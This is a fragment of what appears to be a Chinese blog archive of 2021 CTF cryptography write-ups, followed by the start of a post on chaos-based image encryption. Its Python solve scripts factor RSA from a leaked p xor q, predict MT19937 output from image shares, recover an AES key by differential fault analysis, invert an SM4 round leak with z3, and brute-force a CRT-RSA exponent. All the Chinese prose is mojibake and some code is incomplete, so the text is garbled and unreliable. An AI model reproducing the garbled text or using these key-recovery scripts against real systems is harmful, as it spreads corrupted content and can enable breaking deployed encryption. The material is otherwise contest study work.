nçš„é«˜ä½å’Œä½ä½\nä¹˜æ³•æ¡ä»¶ä¸­ï¼Œä½ä½ç”±äºæ²¡æœ‰è¿›ä½ï¼Œç›´æ¥åˆ¤æ–­$a*b =n;mod;2^{i}-1$\né«˜ä½ç”±äºåˆè¿›ä½ï¼Œä½¿ç”¨é«˜ä½ç›¸åŒæ—¶çš„å¿…è¦æ¡ä»¶if n_highbits-temp2 \u0026gt;= 0 and n_highbits-temp2 \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): a = 111\nb = 100\na*a = 1 1000 1\nb*b = 010000\nå½“ç„¶ï¼Œè¿™ä¾æ—§æ˜¯ä¸€ä¸ªååˆ†ç²—ç•¥çš„å¿…è¦æ¡ä»¶ã€‚ã€‚ã€‚ã€‚\næ­£åºexp\n# åˆå§‹åŒ–ç¬¬1ä½çš„å·²çŸ¥æ•°ï¼š0 def getab(n,x,lenth): a_list=[0] b_list=[0] # è¿™é‡Œåˆ¤æ–­512ä½åº”è¯¥å°±å¤Ÿäº†é˜¿ã€‚ã€‚ã€‚ã€‚ mask = 0 for i in range(lenth): # å–ç¬¬nä½ mask = 2**(i+1)-1 xi = (x\u0026gt;\u0026gt;i) \u0026amp; 1 nextA_list=[] nextB_list=[] for ai in range(2): for bi in range(2): for j in range(len(a_list)): if (ai^bi == xi): nlow = n \u0026amp; mask axbLow = (((ai\u0026lt;\u0026lt;i)+a_list[j])*((bi\u0026lt;\u0026lt;i)+b_list[j]))\u0026amp;mask if(nlow==axbLow): nextA_list.append((ai\u0026lt;\u0026lt;i)+a_list[j]) nextB_list.append((bi\u0026lt;\u0026lt;i)+b_list[j]) # a_list = nextA_list b_list = nextB_list for a in a_list: if(n%a==0): return(a,n//a) lenth = 512 n = 83876349443792695800858107026041183982320923732817788196403038436907852045968678032744364820591254653790102051548732974272946672219653204468640915315703578520430635535892870037920414827506578157530920987388471203455357776260856432484054297100045972527097719870947170053306375598308878558204734888246779716599 x = 4700741767515367755988979759237706359789790281090690245800324350837677624645184526110027943983952690246679445279368999008839183406301475579349891952257846 a,b = getab(n,x,lenth) from icecream import * ic(a,b) å€’åºexp\ndef get_cd(n,x,lenth): p_low = [0] q_high = [0] q_low = [0] p_high = [0] # maskn = 2 maskn = 0 for i in range(lenth//2): maskn = 2**(i+1)-1 xi = (x \u0026gt;\u0026gt; i )\u0026amp;1 n_lowbits = (n \u0026amp; maskn) # é«˜ä½åˆ¤æ–­ä»lenth-1å¤„å¼€å§‹ High_index = lenth-1 -i XHi = (x \u0026gt;\u0026gt; (High_index))\u0026amp;1 n_highbits = (n)\u0026gt;\u0026gt; (High_index) *2 nextP_l = [] nextQ_l = [] nextP_h =[] nextQ_h =[] for j in range(len(p_low)): for pl in range(2): for ql in range(2): for ph in range(2): for qh in range(2): if pl ^ qh == xi and ql ^ ph == XHi: PlxQl = (((pl\u0026lt;\u0026lt;i) + p_low[j]) * ((ql\u0026lt;\u0026lt;i) + q_low[j])) \u0026amp; maskn PhxQh = (((ph \u0026lt;\u0026lt; (High_index)) + p_high[j]) * ((qh \u0026lt;\u0026lt; (High_index)) + q_high[j]))\u0026gt;\u0026gt;(High_index)*2 if PlxQl == n_lowbits : # if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1) # é«˜nä½çš„å·®åœ¨ 2^(i+1)-1ä»¥å†…æ˜¯ é«˜ä½ç›¸åŒçš„å¿…è¦æ¡ä»¶ if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): nextP_l.append((pl\u0026lt;\u0026lt;i) + p_low[j]) nextQ_l.append((ql\u0026lt;\u0026lt;i) + q_low[j]) nextP_h.append((ph\u0026lt;\u0026lt;(High_index))+p_high[j]) nextQ_h.append((qh\u0026lt;\u0026lt;(High_index))+q_high[j]) p_low = nextP_l q_low = nextQ_l p_high = nextP_h q_high = nextQ_h for a in p_low: for b in p_high: if n %(a+b) ==0: p = a + b q = n//p print(p,q) break n2 = 65288148454377101841888871848806704694477906587010755286451216632701868457722848139696036928561888850717442616782583309975714172626476485483361217174514747468099567870640277441004322344671717444306055398513733053054597586090074921540794347615153542286893272415931709396262118416062887003290070001173035587341 x2 =3604386688612320874143532262988384562213659798578583210892143261576908281112223356678900083870327527242238237513170367660043954376063004167228550592110478 lenth = 512 get_cd(n2,x2,lenth) # ic(p,q) ç¨å¾®æ”¹äº†ä¸€ä¸‹åŸpé˜´é—´çš„ä½è¿ç®—\nn1ctf2021 # å’•å’•å’•äº†å¥½ä¹…\nvss # éš¾ç‚¹åœ¨éšæœºæ•°é¢„æµ‹ä¸Šé¢ å…ˆä½¿ç”¨äº†ä¸€ä¸ªäºŒç»´ç ç”Ÿæˆ\nqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=12, border=4, ) qr.add_data(FLAG) qr.make(fit=True) img = qr.make_image(fill_color=\u0026#34;black\u0026#34;, back_color=\u0026#34;white\u0026#34;) RGB = 0xffffff æ˜¯ç™½è‰²\nRGB = 0 æ˜¯é»‘è‰²\nåœ¨å¡«å……åƒç´ æ—¶\nå½“ pixel !=255 æ—¶å¡«å……åœ¨ 2x, 2y çš„ colorä¼šä¸ä¸€æ ·\nè‹¥èƒ½è·å¾—ä¸€å¤§æ®µè¿ç»­çš„ä¸€æ ·çš„pixel ï¼Œåªè¦é€šè¿‡åˆ¤æ–­nä¸ªè¿ç»­ color0 / color1çš„å€¼å°±å¯ä»¥æ¢å¤å‡ºéšæœºæ•°MT9937çš„å½“å‰çŠ¶æ€ï¼Œä¸ç®¡æ˜¯å‘å‰è¿˜æ˜¯å‘åæ¨éƒ½å¯ä»¥å¾—åˆ°åŠ å¯†å›¾ç‰‡ä½¿ç”¨çš„éšæœºæ•°\nif pixel: ... else: share1.putpixel((2*x, 2*y), color0) share1.putpixel((2*x, 2*y+1), color0) ... share2.putpixel((2*x, 2*y), color1) share2.putpixel((2*x, 2*y+1), color1) ... exp\nfrom PIL import Image from randcrack import RandCrack import random share = Image.open(\u0026#39;./share2.png\u0026#39;) width = share.size[0]//2 res = Image.new(\u0026#39;L\u0026#39;, (width, width)) bits = \u0026#39;\u0026#39; # pixelä¸º1å¡«å……0 # pixelä¸º0å¡«å……1 # 01åˆ†åˆ«å¯¹åº”çš„æ˜¯é»‘è‰²çš„å¡«å……å’Œç™½è‰²çš„èƒŒæ™¯åƒç´  # å®˜på–æœ€åä¸€æ®µè¿ç»­ç™½è‰² for idx in range(width*width-624*32, width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: bits += \u0026#39;0\u0026#39; else: bits += \u0026#39;1\u0026#39; # åˆ¤æ–­åƒç´ å rc = RandCrack() for i in range(len(bits), 0, -32): rc.submit(int(bits[i-32:i], 2)) flipped_coins = [int(bit) for bit in bin(rc.predict_getrandbits(width*width-624*32))[2:].zfill(width*width-624*32)] + list(map(int, bits)) data = [] for idx in range(width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: data.append(0 if flipped_coins[idx] else 255) else: data.append(255 if flipped_coins[idx] else 0) res.putdata(data) res.save(\u0026#39;ans.png\u0026#39;) CISCN 2021 oddaes # æ ‡å‡†çš„è¿œå¤æ—¶ä»£çš„aeså·®åˆ†åˆ†æï¼Œåšå‡ºæ¥çš„ä¼°è®¡äº’é€šæœ‰æ— å¾—æ¯”è¾ƒå‰å®³\nå¸‚é¢ä¸Šèƒ½æœåˆ°çš„aeså·®åˆ†è„šæœ¬æœ‰ä¸‰ç§ï¼Œåªæœ‰ä¸€ç§æ˜¯ä¸“é—¨é’ˆå¯¹è¿™ä¸ªé¢˜çš„\nèƒ½ç°å­¦ç°æ‰¾åˆ°çš„éƒ½æ˜¯æ™ºå•†160+çš„è¶…äººğŸ˜…ğŸ˜…ğŸ˜…\næ„Ÿè°¢ChaMd5è®©æœ¬èœé¸¡å­¦ä¹ äº†è¯¥è„šæœ¬çš„ç”¨æ³•\næš‚ä¸”ä¸è®ºä¸ºä»€ä¹ˆç¤¾ä¼šå®‰å…¨å›¢ä½“ä¼šå‚åŠ å¤§å­¦ç”Ÿèµ›äº‹\nDifferential Fault Analysisï¼ˆDFAï¼‰ # å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹FDAæ˜¯ä¸ªå•¥\nDifferential fault analysis (DFA) is a type of active side-channel attack in the field of cryptography, specifically cryptanalysis. The principle is to induce faultsâ€”unexpected environmental conditionsâ€”into cryptographic implementations, to reveal their internal states.\nFor example, a smartcard containing an embedded processor might be subjected to high temperature, unsupported supply voltage or current, excessively high overclocking, strong electric or magnetic fields, or even ionizing radiation to influence the operation of the processor. The processor may begin to output incorrect results due to physical data corruption, which may help a cryptanalyst deduce the instructions that the processor is running, or what its internal data state is.\nFor DES and Triple DES, about 200 single-flipped bits are necessary to obtain a secret key.DFA was also applied successfully to the AES cipher.\nç®€å•åœ°è¯´å°±æ˜¯å‘å¯†ç ç³»ç»Ÿå†…å¼•å…¥ä¸€å®šçš„é”™è¯¯ï¼Œä½“ç°ä¸ºåŠ å…¥ä»¥ä¸‹ç»†å°çš„å˜åŒ–ï¼Œä½¿å…¶ä¸æ ‡å‡†åŠ å¯†ç›¸æ¯”ä¼šæœ‰æ‰€ä¸åŒã€‚\nå®éªŒæƒ…å†µä¸ºæ‰‹åŠ¨åŠ å…¥é”™è¯¯ï¼Œç°å®æƒ…å†µå¯èƒ½æ˜¯ç”±å¤©æ°”æ¸©åº¦ç­‰ç‰©ç†å› ç´ å¯¼è‡´çš„ä»¥å¤–æƒ…å†µ\nå¯¹desã€3desè€Œè¨€çº¦ä¸¤ç™¾ä¸ªå•ç¿»è½¬ä½å°±è¶³ä»¥è·å–åˆ°å…¶å¯†é’¥\nå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬ä½¿ç”¨ä¸¤å¥—ä¸ä¸€æ ·çš„åŠ å¯†ç³»ç»ŸåŠ å¯†äº†åŒä¸€å¥—æ˜æ–‡ï¼Œè€Œä¸¤å¥—åŠ å¯†ç³»ç»Ÿçš„ä¸åŒæ˜¯å·²çŸ¥çš„ä¸”å¾®å°çš„ï¼Œé€šè¿‡å¯¹å¯†æ–‡åˆ†æï¼Œæœ‰å‡ ç‡å¾—åˆ°å¯†é’¥\nanalysis and implement # https://eprint.iacr.org/2009/575.pdf\nAbstract. In this paper we present a differential fault attack that can be applied to the AES using a single fault. We demonstrate that when a single random byte fault is induced at the input of the eighth round, the AES key can be deduced using a two stage algorithm.\nåœ¨è¿™ç¯‡æ–‡ç« ä¸­ä»‹ç»äº†é’ˆå¯¹ç¬¬å…«è½®çš„è¾“å…¥ä¸­å¼•å‘å•ä¸ªéšæœºå­—èŠ‚é”™è¯¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤é˜¶æ®µç®—æ³•æ¨å¯¼å‡º AES å¯†é’¥çš„ç®—æ³•ï¼ˆå…¶å®åé¢æ­£å¼attackğŸ‘´ä¸€ä¸ªå­—éƒ½æ²¡çœ‹ï¼‰\nConclusion\nthese attacks can be conducted without any knowledge of the plaintext being enciphered, as an attacker would just need to know the plaintexts were the same\nå¥½äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ç°é¢˜ç›®ç»™å‡ºçš„æƒ…å†µå’Œè®ºæ–‡ä¸­çš„æƒ…å†µæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ğŸ™„ğŸ™„ğŸ™„\ndef encrypt_block(self, plaintext): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) return matrix2bytes(plain_state) def encrypt_block_(self, plaintext,bytee): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): # æ•…æ„åœ¨ç¬¬å…«è½®ä¸­æ‰‹åŠ¨åŠ å…¥äº†å·®é”™ã€‚ã€‚ã€‚ã€‚ if i==8: plain_state[0][0] ^= bytee sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) keym = self._key_matrices[-1] return matrix2bytes(plain_state),keym[0]+keym[1]+keym[2]+keym[3] https://github.com/Daeinar/dfa-aes\nç›´æ¥æŠŠè¿™ä¸ªåº“é‡Œé¢çš„example1çš„input-1.csvä¸¤æ®µå¯†æ–‡æ¢æˆé¢˜ç›®ç»™å‡ºçš„å¯†æ–‡å°±å¯ä»¥å¾—åˆ°ä¸€å †matter keysï¼ŒæŠŠæ‰€æœ‰matter keysæ‹¿è¿›å»éå†å°±å¾—åˆ°keyäº†\ncsvçš„æ–‡ä»¶ç»“æ„å’ŒtxtåŸºæœ¬ä¸€æ ·\nfrom aes import AES import os,hashlib,random from tqdm import tqdm # ----------------------------------- f = open(\u0026#39;keys-0.csv\u0026#39;,\u0026#39;r\u0026#39;) plain = os.urandom(16) m1 = \u0026#39;973f5ae78bc933a8fc7f7ab98d53d16f\u0026#39; m2 = \u0026#39;628aab012199cdab83cc1aa72204ea98\u0026#39; s = random.randint(0,255) for i in tqdm(range(4266)): key = f.readline().replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) cipher,k = AES(bytes.fromhex(key)).encrypt_block_(plain,s) piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]] m11 = hashlib.md5(bytes(piece1)).hexdigest() piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]] m22 = hashlib.md5(bytes(piece2)).hexdigest() if m11 == m1 and m22 == m2: print(key) print(\u0026#34;CISCN{\u0026#34;+hashlib.md5(bytes.fromhex(key)).hexdigest()+\u0026#34;}\u0026#34;) break ç™«ç–¯æå®¢2021è¡¥æ¡£ 7-31 # ä¸œæ‹¼è¥¿å‡‘æŠŠwpå‡‘é½äº†ğŸ™„\nlearnSM4 # SM4é‡‡ç”¨å’Œaeså®Œå…¨ä¸åŒçš„ç»“æ„\nåˆ—å¦‚åœ¨ç¬¬ä¸€è½®ä¸­ï¼Œä½¿ç”¨åŸæœ‰æ˜æ–‡ç”Ÿ$X_0X_1X_2X_3$æˆæ–°çš„æ˜æ–‡$X_4$\nåœ¨$n$è½®åé€‰å–æœ€åå››ä¸ª$X$ä½œä¸ºå¯†æ–‡\nè¿™é‡Œæ•…æ„åŠ å…¥leakå¯ä»¥åœ¨ç¬¬ä¸€è½®å’Œç¬¬äºŒè½®æ³„éœ²ç”¨$X_0X_1X_2X_3$ç”Ÿæˆçš„$X_4$\ndef _crypthack(num, mk, rou,index): x_keys = list(_byte_unpack(num, byte_n=16)) round_keys = _round_keys(mk) leak = 0 for i in _range(32): reg = _round_f(x_keys[i:i+4], round_keys[i]) x_keys.append(reg) # use x0123 get x4 reg = _byte_unpack(reg) if i == rou: leak = reg[index] return _byte_pack(x_keys[-4:][::-1], byte_n=16),leak ç”Ÿæˆå…¬å¼å¦‚ä¸‹\n$X_4=repT(X_1\\oplus X_2\\oplus X_3\\oplus roundKey)$\ndef _round_f(byte4_array, rk): x0, x1, x2, x3 = byte4_array print(x0, x1, x2, x3) return x0 ^ _rep_t(x1 ^ x2 ^ x3 ^ rk) ä¹Ÿå°±æ˜¯è¯´æ‰¾åˆ°$repT$çš„é€†ç®—æ³•å°±èƒ½æ±‚roundKey[0]äº†\nç„¶åå°±é™·å…¥äº†åƒµå±€ã€‚ã€‚å†™åŠå¤©å±€éƒ¨çˆ†ç ´æ¯å¼„å‡ºæ¥\näº‹åå‘ç°æœ‰äººç”¨z3ç›´æ¥æ¢­å“ˆã€‚ã€‚ã€‚\næ„é€ $X_4=1\\oplus repT(0\\oplus 0\\oplus 0\\oplus roundKey)$\nä¾æ¬¡è¾“å…¥r = 0 i=0~3 msg=0000001000000000000000000000000\nimport z3 S_BOX = { 0X00: 0XD6, 0X01: 0X90, 0X02: 0XE9, 0X03: 0XFE, 0X04: 0XCC, 0X05: 0XE1, 0X06: 0X3D, 0X07: 0XB7, 0X08: 0X16, 0X09: 0XB6, 0X0A: 0X14, 0X0B: 0XC2, 0X0C: 0X28, 0X0D: 0XFB, 0X0E: 0X2C, 0X0F: 0X05, 0X10: 0X2B, 0X11: 0X67, 0X12: 0X9A, 0X13: 0X76, 0X14: 0X2A, 0X15: 0XBE, 0X16: 0X04, 0X17: 0XC3, 0X18: 0XAA, 0X19: 0X44, 0X1A: 0X13, 0X1B: 0X26, 0X1C: 0X49, 0X1D: 0X86, 0X1E: 0X06, 0X1F: 0X99, 0X20: 0X9C, 0X21: 0X42, 0X22: 0X50, 0X23: 0XF4, 0X24: 0X91, 0X25: 0XEF, 0X26: 0X98, 0X27: 0X7A, 0X28: 0X33, 0X29: 0X54, 0X2A: 0X0B, 0X2B: 0X43, 0X2C: 0XED, 0X2D: 0XCF, 0X2E: 0XAC, 0X2F: 0X62, 0X30: 0XE4, 0X31: 0XB3, 0X32: 0X1C, 0X33: 0XA9, 0X34: 0XC9, 0X35: 0X08, 0X36: 0XE8, 0X37: 0X95, 0X38: 0X80, 0X39: 0XDF, 0X3A: 0X94, 0X3B: 0XFA, 0X3C: 0X75, 0X3D: 0X8F, 0X3E: 0X3F, 0X3F: 0XA6, 0X40: 0X47, 0X41: 0X07, 0X42: 0XA7, 0X43: 0XFC, 0X44: 0XF3, 0X45: 0X73, 0X46: 0X17, 0X47: 0XBA, 0X48: 0X83, 0X49: 0X59, 0X4A: 0X3C, 0X4B: 0X19, 0X4C: 0XE6, 0X4D: 0X85, 0X4E: 0X4F, 0X4F: 0XA8, 0X50: 0X68, 0X51: 0X6B, 0X52: 0X81, 0X53: 0XB2, 0X54: 0X71, 0X55: 0X64, 0X56: 0XDA, 0X57: 0X8B, 0X58: 0XF8, 0X59: 0XEB, 0X5A: 0X0F, 0X5B: 0X4B, 0X5C: 0X70, 0X5D: 0X56, 0X5E: 0X9D, 0X5F: 0X35, 0X60: 0X1E, 0X61: 0X24, 0X62: 0X0E, 0X63: 0X5E, 0X64: 0X63, 0X65: 0X58, 0X66: 0XD1, 0X67: 0XA2, 0X68: 0X25, 0X69: 0X22, 0X6A: 0X7C, 0X6B: 0X3B, 0X6C: 0X01, 0X6D: 0X21, 0X6E: 0X78, 0X6F: 0X87, 0X70: 0XD4, 0X71: 0X00, 0X72: 0X46, 0X73: 0X57, 0X74: 0X9F, 0X75: 0XD3, 0X76: 0X27, 0X77: 0X52, 0X78: 0X4C, 0X79: 0X36, 0X7A: 0X02, 0X7B: 0XE7, 0X7C: 0XA0, 0X7D: 0XC4, 0X7E: 0XC8, 0X7F: 0X9E, 0X80: 0XEA, 0X81: 0XBF, 0X82: 0X8A, 0X83: 0XD2, 0X84: 0X40, 0X85: 0XC7, 0X86: 0X38, 0X87: 0XB5, 0X88: 0XA3, 0X89: 0XF7, 0X8A: 0XF2, 0X8B: 0XCE, 0X8C: 0XF9, 0X8D: 0X61, 0X8E: 0X15, 0X8F: 0XA1, 0X90: 0XE0, 0X91: 0XAE, 0X92: 0X5D, 0X93: 0XA4, 0X94: 0X9B, 0X95: 0X34, 0X96: 0X1A, 0X97: 0X55, 0X98: 0XAD, 0X99: 0X93, 0X9A: 0X32, 0X9B: 0X30, 0X9C: 0XF5, 0X9D: 0X8C, 0X9E: 0XB1, 0X9F: 0XE3, 0XA0: 0X1D, 0XA1: 0XF6, 0XA2: 0XE2, 0XA3: 0X2E, 0XA4: 0X82, 0XA5: 0X66, 0XA6: 0XCA, 0XA7: 0X60, 0XA8: 0XC0, 0XA9: 0X29, 0XAA: 0X23, 0XAB: 0XAB, 0XAC: 0X0D, 0XAD: 0X53, 0XAE: 0X4E, 0XAF: 0X6F, 0XB0: 0XD5, 0XB1: 0XDB, 0XB2: 0X37, 0XB3: 0X45, 0XB4: 0XDE, 0XB5: 0XFD, 0XB6: 0X8E, 0XB7: 0X2F, 0XB8: 0X03, 0XB9: 0XFF, 0XBA: 0X6A, 0XBB: 0X72, 0XBC: 0X6D, 0XBD: 0X6C, 0XBE: 0X5B, 0XBF: 0X51, 0XC0: 0X8D, 0XC1: 0X1B, 0XC2: 0XAF, 0XC3: 0X92, 0XC4: 0XBB, 0XC5: 0XDD, 0XC6: 0XBC, 0XC7: 0X7F, 0XC8: 0X11, 0XC9: 0XD9, 0XCA: 0X5C, 0XCB: 0X41, 0XCC: 0X1F, 0XCD: 0X10, 0XCE: 0X5A, 0XCF: 0XD8, 0XD0: 0X0A, 0XD1: 0XC1, 0XD2: 0X31, 0XD3: 0X88, 0XD4: 0XA5, 0XD5: 0XCD, 0XD6: 0X7B, 0XD7: 0XBD, 0XD8: 0X2D, 0XD9: 0X74, 0XDA: 0XD0, 0XDB: 0X12, 0XDC: 0XB8, 0XDD: 0XE5, 0XDE: 0XB4, 0XDF: 0XB0, 0XE0: 0X89, 0XE1: 0X69, 0XE2: 0X97, 0XE3: 0X4A, 0XE4: 0X0C, 0XE5: 0X96, 0XE6: 0X77, 0XE7: 0X7E, 0XE8: 0X65, 0XE9: 0XB9, 0XEA: 0XF1, 0XEB: 0X09, 0XEC: 0XC5, 0XED: 0X6E, 0XEE: 0XC6, 0XEF: 0X84, 0XF0: 0X18, 0XF1: 0XF0, 0XF2: 0X7D, 0XF3: 0XEC, 0XF4: 0X3A, 0XF5: 0XDC, 0XF6: 0X4D, 0XF7: 0X20, 0XF8: 0X79, 0XF9: 0XEE, 0XFA: 0X5F, 0XFB: 0X3E, 0XFC: 0XD7, 0XFD: 0XCB, 0XFE: 0X39, 0XFF: 0X48 } def getnum(arr): HEX = \u0026#39;\u0026#39; for i in arr: HEX += hex(i)[2:] return int(HEX,16) # ç”¨z3é€†Tå˜æ¢ä¸­çš„r(x) def f(B): B1 = (((B \u0026lt;\u0026lt; 2 ) \u0026amp; 0b1100000000000000000000000000000000) \u0026gt;\u0026gt;32) ^ (B \u0026lt;\u0026lt; 2) \u0026amp; 0xffffffff B2 = (((B \u0026lt;\u0026lt; 10) \u0026amp; 0b111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;10) \u0026amp; 0xffffffff B3 = (((B \u0026lt;\u0026lt; 18) \u0026amp; 0b11111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;18) \u0026amp; 0xffffffff B4 = (((B \u0026lt;\u0026lt; 24) \u0026amp; 0b11111111111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;24) \u0026amp; 0xffffffff return B ^ B1 ^ B2 ^ B3 ^ B4 S = z3.Solver() x = z3.BitVec(\u0026#39;x\u0026#39;,64) # å››æ¬¡è·å–çš„x4 S.add((getnum([173,171,64,87])^1)- f(x)==0) if S.check(): print(S.model()) # [x = 2810370552] print(hex(2810370552)[2:]) # 0x842586b9 key = \u0026#39;0\u0026#39; arr = [0xa7,0x82,0xd9,0xf8] for i in arr: key += hex(findS(i))[2:] print(int(key,16)) crtrsa # æ²¡è¿™ä¹ˆçœ‹è¿™ä¸ªï¼Œçœ‹å®Œwpçš„çˆ†ç ´æ„Ÿè§‰æ™ºå•†æ”¶åˆ°äº†ä¾®è¾±ã€‚ã€‚\nfrom gmpy2 import * from Crypto.Util.number import * from tqdm import tqdm from rich.progress import track from rich.traceback import install install() # ----------------------------------- N = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983 e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887 c=4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399 a=2 A=powmod(a,e,N) for dp in tqdm(range(1,2**20)): if gcd(powmod(A,dp,N)-a,N)!=1 and gcd(powmod(A,dp,N)-a,N)!=N: p=gcd(pow(A,dp,N)-a,N) q=N//p phi=(p-1)*(q-1) d=invert(e,phi) m=pow(c,d,N) print(long_to_bytes(m)) break æŠ„ï¼Œæˆ‘ç–¯ç‹‚æŠ„\n","date":"9 August 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%981/","section":"archive","summary":"","title":"é—²é¢˜æ‚è®°"},{"content":"é‡‡ç”¨çš„åŸå› ï¼šæ—©æœŸçš„å›¾åƒåŠ å¯†æ–¹æ³•ä¸»è¦åŸºäºç°æœ‰çš„æ•°æ®åŠ å¯†æŠ€æœ¯ï¼Œå¦‚DESã€AESç­‰ã€‚ç„¶è€Œï¼Œç”±äºå›¾åƒæœ¬èº«çš„å›ºæœ‰ç‰¹æ€§ï¼Œè¿™äº›æ–¹æ³•çš„æ•ˆç‡å’ŒæŠ—æ”»å‡»èƒ½åŠ›éƒ½è¾ƒå¼±ã€‚è¿‘å¹´æ¥ï¼ŒåŸºäºæ··æ²Œçš„å›¾åƒåŠ å¯†æ–¹æ³•è¶Šæ¥è¶Šå—åˆ°é‡è§†ã€‚ä¸ä¼ ç»Ÿçš„éæ··æ²Œå›¾åƒåŠ å¯†ç›¸æ¯”ï¼ŒåŸºäºæ··æ²Œçš„å›¾åƒåŠ å¯†å…·æœ‰å¯†é’¥ç©ºé—´å¤§ã€é€Ÿåº¦å¿«ã€æ˜“äºå®ç°ç­‰ä¼˜ç‚¹\nå›¾åƒæ–‡ä»¶åŠ å¯†ä¸æ™®é€šæ–‡ä»¶åŠ å¯†çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå›¾åƒç›¸é‚»åƒç´ ä¹‹é—´é€šå¸¸å­˜åœ¨ç€æ¯”è¾ƒå¤§çš„ç›¸å…³æ€§ï¼Œå¯¹å›¾åƒåŠ å¯†ä¸ä»…è¦ä½¿å›¾åƒå˜å¾—ä¸å¯è¯†åˆ«ï¼Œè¿˜è¦å°½å¯èƒ½åœ°å‡å°ç›¸é‚»åƒç´ ä¹‹é—´çš„ç›¸å…³æ€§ã€‚\nè™«å£æ¨¡å‹ Logistic æ··æ²Œæ˜ å°„ # å¦‚æœä¸€ä¸ªç³»ç»Ÿçš„æ¼”å˜è¿‡ç¨‹å¯¹åˆå§‹çš„çŠ¶æ€ååˆ†æ•æ„Ÿï¼Œå°±æŠŠè¿™ä¸ªç³»ç»Ÿç§°ä¸ºæ˜¯æ··æ²Œç³»ç»Ÿã€‚\nåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦æ¢è®¨ä¸€ç»´Logisticæ˜ å°„çš„ä¸€äº›ç‰¹æ€§\nä¸€ç»´Logisticæ˜ å°„ä»æ•°å­¦å½¢å¼ä¸Šæ¥çœ‹æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„æ··æ²Œæ˜ å°„ï¼Œæ—©åœ¨20ä¸–çºª50å¹´ä»£ï¼Œæœ‰å¥½å‡ ä½ç”Ÿæ€å­¦å®¶å°±åˆ©ç”¨è¿‡è¿™ä¸ªç®€å•çš„å·®åˆ†æ–¹ç¨‹ï¼Œæ¥æè¿°ç§ç¾¤çš„å˜åŒ–ã€‚æ­¤ç³»ç»Ÿå…·æœ‰æå…¶å¤æ‚çš„åŠ¨åŠ›å­¦è¡Œä¸ºï¼Œåœ¨ä¿å¯†é€šä¿¡é¢†åŸŸçš„åº”ç”¨ååˆ†å¹¿æ³›ï¼Œå…¶æ•°å­¦è¡¨è¾¾å…¬å¼å¦‚ä¸‹ï¼š\n$X_{n+1}=X_n \\times \\mu \\times (1-X_n)$\n$\\mu \\in[0,4];X\\in[0,1]$\nå…¶ä¸­$\\mu$è¢«ç§°ä¸ºLogisticå‚æ•°ã€‚ç ”ç©¶è¡¨æ˜ï¼Œå½“$X\\in[0,1]$æ—¶ï¼ŒLogistic æ˜ å°„å·¥ä½œå¤„äºæ··æ²ŒçŠ¶æ€ï¼Œ\nä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰åˆå§‹æ¡ä»¶$X_n$åœ¨Logisticæ˜ å°„ä½œç”¨ä¸‹äº§ç”Ÿçš„åºåˆ—æ˜¯éå‘¨æœŸçš„ã€ä¸æ”¶æ•›çš„ï¼Œè€Œåœ¨æ­¤èŒƒå›´ä¹‹å¤–ï¼Œç”Ÿæˆçš„åºåˆ—å¿…å°†æ”¶æ•›äºæŸä¸€ä¸ªç‰¹å®šçš„å€¼\nå¯ä»¥çœ‹å‡ºï¼Œåœ¨Î¼çš„å–å€¼ç¬¦åˆ3.5699456\u0026lt;Î¼\u0026lt;=4çš„æ¡ä»¶ï¼Œç‰¹åˆ«æ˜¯æ¯”è¾ƒé 